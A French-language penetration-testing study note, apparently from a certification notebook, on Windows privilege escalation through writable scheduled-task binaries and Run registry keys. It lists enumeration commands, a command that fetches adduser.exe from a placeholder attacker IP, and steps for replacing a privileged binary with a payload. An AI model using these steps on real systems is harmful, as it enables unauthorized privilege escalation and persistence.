# 08-Tâches Planifiées et Clés de Démarrage Automatique

Les tâches planifiées et les programmes configurés pour s'exécuter automatiquement au démarrage peuvent être des vecteurs d'escalade de privilèges si leurs configurations sont faibles.

## Tâches Planifiées (Scheduled Tasks)

**1. Énumération des Tâches Planifiées**
```powershell
# Lister toutes les tâches (format liste détaillé)
schtasks /query /fo LIST /v

# Lister les tâches (format table)
schtasks /query /fo TABLE /nh # /nh pour ne pas afficher les en-têtes

# Avec PowerShell
Get-ScheduledTask
Get-ScheduledTask | Get-ScheduledTaskInfo
Get-ScheduledTask | ? {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State, Actions, Principal
```
Recherchez :
*   **Principal (Run As User) :** Tâches s'exécutant en tant que `NT AUTHORITY\SYSTEM`, un administrateur, ou un utilisateur avec plus de privilèges.
*   **Actions (Task To Run) :** Le binaire ou script exécuté.
*   **Permissions sur le binaire/script :** Si vous pouvez modifier le fichier exécuté par une tâche privilégiée.
*   **Permissions sur le répertoire du binaire/script :** Si vous pouvez remplacer le binaire via un DLL Hijacking ou en modifiant le PATH.
*   **Déclencheurs (Triggers) :** Quand la tâche s'exécute (au démarrage, à l'ouverture de session, périodiquement).

**2. Exploitation**

**Cas 1 : Permissions d'écriture sur le binaire de la tâche**
Si une tâche s'exécute en tant que SYSTEM et que vous pouvez modifier le binaire qu'elle exécute :
```powershell
# Exemple : La tâche "\Microsoft\CacheCleanup" exécute "C:\Users\steve\Pictures\BackendCacheCleanup.exe" en tant que "CLIENTWK220\daveadmin"
# (Extrait de 04-things-to-add.md)

# Vérifier les permissions sur le binaire
PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
# ... CLIENTWK220\steve:(I)(F)  <-- L'utilisateur steve a un accès complet (F)

# Créer un payload (ex: adduser.exe)
# x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Remplacer le binaire original
PS C:\Users\steve> iwr -Uri http://<IP_ATTAQUANT>/adduser.exe -Outfile BackendCacheCleanup_new.exe
PS C:\Users\steve> move C:\Users\steve\Pictures\BackendCacheCleanup.exe C:\Users\steve\Pictures\BackendCacheCleanup.exe.bak
PS C:\Users\steve> move .\BackendCacheCleanup_new.exe C:\Users\steve\Pictures\BackendCacheCleanup.exe
```
Attendez que la tâche s'exécute (selon son déclencheur, par exemple, toutes les minutes, au prochain démarrage, etc.).

**Cas 2 : Permissions d'écriture sur le répertoire de la tâche (DLL Hijacking)**
Si le binaire de la tâche charge une DLL depuis son propre répertoire et que vous pouvez écrire dans ce répertoire, vous pouvez tenter un DLL Hijacking.

**Cas 3 : Modification de la tâche (si vous avez les permissions)**
Si votre utilisateur a le droit de modifier la tâche, vous pouvez changer le binaire exécuté ou l'utilisateur sous lequel elle s'exécute.
```powershell
# Modifier l'action d'une tâche (nécessite des privilèges sur la tâche)
schtasks /change /tn "NomDeLaTache" /tr "C:\chemin\vers\votre\payload.exe"
# Modifier l'utilisateur (nécessite le mot de passe si ce n'est pas SYSTEM)
# schtasks /change /tn "NomDeLaTache" /ru "NT AUTHORITY\SYSTEM"
```

## Clés de Registre de Démarrage Automatique (Autoruns)
Les programmes listés dans certaines clés de registre s'exécutent automatiquement au démarrage ou à l'ouverture de session.

**1. Énumération des Clés de Démarrage**
```powershell
# Pour tous les utilisateurs (HKLM - Local Machine)
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run   # Pour les applications 32 bits sur OS 64 bits
reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce

# Pour l'utilisateur courant (HKCU - Current User)
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Avec PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
# etc.

# Utiliser Autoruns de Sysinternals pour une vue complète
# autorunsc.exe -a * -ct -accepteula
```
Recherchez les programmes dont vous pouvez modifier le binaire ou le répertoire.

**2. Exploitation**
Similaire aux tâches planifiées : si un programme listé dans une clé de démarrage s'exécute avec des privilèges élevés (rare pour les entrées `Run` de HKCU, plus probable pour HKLM si mal configuré) et que vous pouvez modifier son binaire ou son répertoire (pour DLL Hijacking), vous pouvez obtenir une exécution de code privilégiée au prochain démarrage/connexion.

**Exemple : Remplacer un binaire pointé par une clé `Run`**
1.  Identifiez une entrée dans `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` qui pointe vers un binaire sur lequel vous avez des droits d'écriture.
2.  Remplacez ce binaire par votre payload.
3.  Au prochain redémarrage, si le service/programme associé à cette clé s'exécute avec des privilèges élevés, votre payload le fera aussi.

Il est plus courant que les clés `Run` soient exploitables si l'application cible elle-même a une vulnérabilité (par exemple, elle s'exécute en tant que SYSTEM mais son binaire est modifiable par un utilisateur standard). 